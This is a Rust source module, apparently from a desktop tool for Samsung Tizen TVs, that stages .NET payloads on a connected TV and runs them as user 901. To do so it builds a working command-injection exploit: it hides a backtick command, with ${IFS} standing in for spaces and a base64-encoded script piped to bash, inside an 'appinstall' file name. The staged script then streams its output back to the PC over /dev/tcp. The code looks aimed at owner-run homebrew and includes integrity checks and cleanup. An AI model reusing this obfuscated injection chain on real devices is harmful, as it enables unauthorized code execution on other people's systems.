//! Owned SDK UID 901 staging, single-use launch and bounded callback transport.
use super::{digest::sha256_hex, sdb::Sdb};
use crate::models::{AppError, AppResult};
use base64::{engine::general_purpose::STANDARD, Engine};
use serde::Serialize;
use std::{
    net::{IpAddr, Ipv4Addr},
    time::Duration,
};
use tokio::{
    io::AsyncReadExt,
    net::{TcpListener, UdpSocket},
    time::timeout,
};

const DIRECTORY: &str = "/home/owner/share/tmp/sdk_tools";
pub(super) const CLEANUP_MARKER: &str = "AEROTIZEN_SDK_CLEANED";
const EXIT_PREFIX: &str = "AEROTIZEN_SDK_EXIT=";
const DOTNET_UNAVAILABLE: &str = "AEROTIZEN_SDK_DOTNET_UNAVAILABLE";
const MAX_PAYLOAD_BYTES: usize = 2 * 1024 * 1024;
const MAX_OUTPUT_BYTES: usize = 128 * 1024;
const MAX_COMMAND_BYTES: usize = 400;
const MAX_NAME_BYTES: usize = 80;
const TOKEN_BYTES: usize = 6;
const ROUTE_PORT: u16 = 9;
const SDK_TIMEOUT: Duration = Duration::from_secs(70);
const SHELL_TIMEOUT: Duration = Duration::from_secs(30);
const ACCEPT_TIMEOUT: Duration = Duration::from_secs(35);
const READ_TIMEOUT: Duration = Duration::from_secs(30);
#[derive(Clone)]
pub(super) struct PayloadFile {
    pub name: String,
    pub bytes: Vec<u8>,
}
#[derive(Serialize)]
pub(super) struct Completion {
    pub stdout: String,
    pub exit_code: u32,
    pub staging_cleaned: bool,
}
pub(super) struct Launch {
    command: String,
}
impl Launch {
    pub fn service(&self) -> Vec<u8> {
        format!("shell:{}\0", self.command).into_bytes()
    }
}
struct Script {
    body: String,
    launch: Launch,
    stage: String,
    paths: Vec<String>,
}
fn failed() -> AppError {
    AppError::new("sdk_failed","The TV helper did not confirm completion and temporary-file cleanup. Check the current TV settings before retrying.")
}
fn quote(value: &str) -> String {
    if !value.is_empty()
        && value
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b"_@%+=:,./-".contains(&b))
    {
        value.into()
    } else {
        format!("'{}'", value.replace('\'', "'\"'\"'"))
    }
}
fn path(token: &str, name: &str) -> String {
    format!("{DIRECTORY}/ah-{token}-{name}")
}
fn script(
    files: &[PayloadFile],
    entrypoint: &str,
    args: &[&str],
    callback: Ipv4Addr,
    port: u16,
    token: &str,
) -> AppResult<Script> {
    let mut names = std::collections::HashSet::new();
    if port == 0
        || token.len() != TOKEN_BYTES * 2
        || !token
            .bytes()
            .all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b))
        || files.is_empty()
        || files.iter().map(|file| file.bytes.len()).sum::<usize>() > MAX_PAYLOAD_BYTES
        || files.iter().any(|file| {
            file.name.is_empty()
                || file.name.len() > MAX_NAME_BYTES
                || !file
                    .name
                    .bytes()
                    .all(|b| b.is_ascii_alphanumeric() || b"_.-".contains(&b))
                || !names.insert(file.name.as_str())
        })
        || !names.contains(entrypoint)
    {
        return Err(failed());
    }
    let mut checks = vec![
        "if [ ! -x /usr/bin/dotnet ]; then".into(),
        format!("  printf '%s\\n' {DOTNET_UNAVAILABLE}"),
        "  exit 127".into(),
        "fi".into(),
    ];
    for file in files {
        checks.push(format!(
            "printf '%s  %s\\n' {} {} | sha256sum -c - >/dev/null",
            sha256_hex(&file.bytes),
            quote(&path(token, &file.name))
        ));
    }
    let arguments = std::iter::once(path(token, entrypoint))
        .chain(args.iter().map(|arg| {
            if names.contains(arg) {
                path(token, arg)
            } else {
                (*arg).into()
            }
        }))
        .map(|arg| quote(&arg))
        .collect::<Vec<_>>()
        .join(" ");
    checks.push(format!("/usr/bin/dotnet {arguments}"));
    let stage = format!("{DIRECTORY}/ah-{token}.s");
    let claimed = format!("{DIRECTORY}/ah-{token}.r");
    let paths: Vec<_> = files.iter().map(|file| path(token, &file.name)).collect();
    let cleanup = format!(
        "rm -f {}",
        std::iter::once(&stage)
            .chain(std::iter::once(&claimed))
            .chain(paths.iter())
            .map(|path| quote(path))
            .collect::<Vec<_>>()
            .join(" ")
    );
    let body=format!("set -u\numask 077\ntrap {} EXIT\nexec 3<>/dev/tcp/{callback}/{port} || exit 80\n(\nset -eu\ntest \"$(id -u)\" = 901\n{}\n) >&3 2>&3\nresult=$?\n{cleanup} || exit 81\nprintf '\\n{CLEANUP_MARKER}\\n{EXIT_PREFIX}%s\\n' \"$result\" >&3\nexec 3>&-\nexit \"$result\"\n",quote(&cleanup),checks.join("\n"));
    let invocation = format!("/bin/mv {stage} {claimed} 2>/dev/null&&/bin/cat {claimed}|/bin/bash");
    let command = format!(
        "0 appinstall tpk new2.tpk`printf${{IFS}}%s${{IFS}}{}|base64${{IFS}}-d|bash`.tpk",
        STANDARD.encode(invocation)
    );
    if command.len() > MAX_COMMAND_BYTES {
        return Err(failed());
    }
    Ok(Script {
        body,
        launch: Launch { command },
        stage,
        paths,
    })
}
pub(super) fn parse_output(output: String) -> AppResult<Completion> {
    let lines: Vec<_> = output.lines().collect();
    let exits: Vec<_> = lines
        .iter()
        .filter_map(|line| line.strip_prefix(EXIT_PREFIX))
        .collect();
    if lines.iter().filter(|line| **line == CLEANUP_MARKER).count() != 1
        || exits.len() != 1
        || exits[0].is_empty()
        || !exits[0].bytes().all(|b| b.is_ascii_digit())
    {
        return Err(failed());
    }
    let exit_code = exits[0].parse().map_err(|_| failed())?;
    if exit_code == 127 && lines.contains(&DOTNET_UNAVAILABLE) {
        return Err(AppError::new("sdk_unavailable","Native Home is unavailable because the TV has no executable .NET runtime. Use Watcher mode instead."));
    }
    Ok(Completion {
        stdout: output,
        exit_code,
        staging_cleaned: true,
    })
}
async fn callback(listener: TcpListener, host: Ipv4Addr) -> AppResult<String> {
    let (socket, peer) = timeout(ACCEPT_TIMEOUT, listener.accept())
        .await
        .map_err(|_| failed())?
        .map_err(|_| failed())?;
    if peer.ip() != IpAddr::V4(host) {
        return Err(failed());
    }
    let mut bytes = Vec::new();
    timeout(
        READ_TIMEOUT,
        socket
            .take(MAX_OUTPUT_BYTES as u64 + 1)
            .read_to_end(&mut bytes),
    )
    .await
    .map_err(|_| failed())?
    .map_err(|_| failed())?;
    if bytes.len() > MAX_OUTPUT_BYTES {
        return Err(failed());
    }
    Ok(String::from_utf8_lossy(&bytes).into_owned())
}
pub(super) async fn run(
    connection: &mut Sdb,
    host: Ipv4Addr,
    files: &[PayloadFile],
    entrypoint: &str,
    args: &[&str],
) -> AppResult<Completion> {
    timeout(SDK_TIMEOUT, async {
        let route = UdpSocket::bind((Ipv4Addr::UNSPECIFIED, 0))
            .await
            .map_err(|_| failed())?;
        route
            .connect((host, ROUTE_PORT))
            .await
            .map_err(|_| failed())?;
        let IpAddr::V4(callback_address) = route.local_addr().map_err(|_| failed())?.ip() else {
            return Err(failed());
        };
        drop(route);
        let listener = TcpListener::bind((callback_address, 0))
            .await
            .map_err(|_| failed())?;
        let mut random = [0; TOKEN_BYTES];
        getrandom::fill(&mut random).map_err(|_| failed())?;
        let token: String = random.iter().map(|byte| format!("{byte:02x}")).collect();
        let script = script(
            files,
            entrypoint,
            args,
            callback_address,
            listener.local_addr().map_err(|_| failed())?.port(),
            &token,
        )?;
        for (file, path) in files.iter().zip(&script.paths) {
            connection
                .push(path, &mut file.bytes.as_slice(), MAX_PAYLOAD_BYTES as u64)
                .await
                .map_err(|_| failed())?;
        }
        connection
            .push(
                &script.stage,
                &mut script.body.as_bytes(),
                MAX_PAYLOAD_BYTES as u64,
            )
            .await
            .map_err(|_| failed())?;
        let shell = async {
            timeout(SHELL_TIMEOUT, connection.sdk_execute(&script.launch))
                .await
                .map_err(|_| failed())?
                .map_err(|_| failed())
        };
        let (_, output) = tokio::try_join!(shell, callback(listener, host))?;
        parse_output(output)
    })
    .await
    .map_err(|_| failed())?
}
#[cfg(test)]
pub(crate) mod tests;
